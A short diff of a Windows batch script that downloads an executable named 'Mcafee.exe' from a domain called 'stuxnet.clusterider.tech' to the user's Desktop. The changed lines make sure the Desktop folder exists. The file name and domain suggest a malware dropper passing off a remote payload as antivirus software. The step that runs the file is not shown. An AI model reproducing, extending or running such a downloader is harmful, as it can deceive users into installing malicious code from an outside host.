@@ -4,8 +4,16 @@ setlocal
 REM Set the download URL
 set "URL=https://stuxnet.clusterider.tech/download/Mcafee.exe"
 
-REM Get the Desktop path dynamically using PowerShell
+REM Get the real Desktop path using PowerShell
 for /f "usebackq delims=" %%D in (`powershell -NoProfile -Command "[Environment]::GetFolderPath('Desktop')"`) do set "DESKTOP=%%D"
+
+REM Ensure the Desktop folder exists
+if not exist "%DESKTOP%" (
+    echo Desktop folder does not exist. Creating it...
+    mkdir "%DESKTOP%"
+)
+
+REM Set the output path
 set "OUTPUT=%DESKTOP%\Mcafee.exe"
 
 REM Download the file using PowerShell
